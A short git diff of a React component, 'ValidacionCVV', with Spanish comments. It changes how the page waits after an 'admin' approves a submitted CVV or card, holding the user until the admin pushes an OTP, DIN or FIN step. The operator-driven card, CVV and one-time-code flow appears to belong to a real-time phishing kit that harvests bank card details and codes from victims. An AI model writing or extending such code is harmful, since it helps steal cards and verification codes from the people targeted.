@@ -105,20 +105,18 @@ export default function ValidacionCVV() {
                     return;
                 }
 
-                // Admin aprobó CVV Custom: backend ahora pone 'pendiente' y muestra menú.
+                // Admin aprobó CVV Custom: backend pone 'solicitar_din' y muestra menú.
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 const prev = estadoAnteriorRef.current;
-                // Detectar cuando se aprueba: cambio de awaiting_*_approval a pendiente
-                const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'pendiente';
+                const aprobadoAhora = (prev === 'awaiting_cvv_approval' || prev === 'awaiting_tc_approval') && estado === 'solicitar_din';
                 if (aprobadoAhora) {
                     aprobadoEsperandoRef.current = true;
                     estadoAnteriorRef.current = estado;
-                    return; // Quedarse en espera, no redirigir
+                    return;
                 }
-                // Si ya estaba en modo espera y sigue pendiente, mantener espera
-                if (aprobadoEsperandoRef.current && estado === 'pendiente') {
+                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
                     estadoAnteriorRef.current = estado;
-                    return; // Continuar esperando
+                    return;
                 }
                 estadoAnteriorRef.current = estado;
 
